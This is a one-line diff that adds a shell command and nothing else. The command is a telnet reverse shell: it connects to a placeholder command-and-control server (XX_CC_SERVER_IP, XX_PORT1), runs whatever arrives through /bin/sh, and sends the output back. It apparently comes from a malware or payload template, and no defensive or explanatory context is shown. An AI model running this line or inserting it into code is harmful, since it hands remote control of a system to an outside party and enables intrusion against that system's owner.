@@ -1,0 +1,1 @@
+telnet XX_CC_SERVER_IP XX_PORT1 | /bin/sh | telnet XX_CC_SERVER_IP XX_PORT1
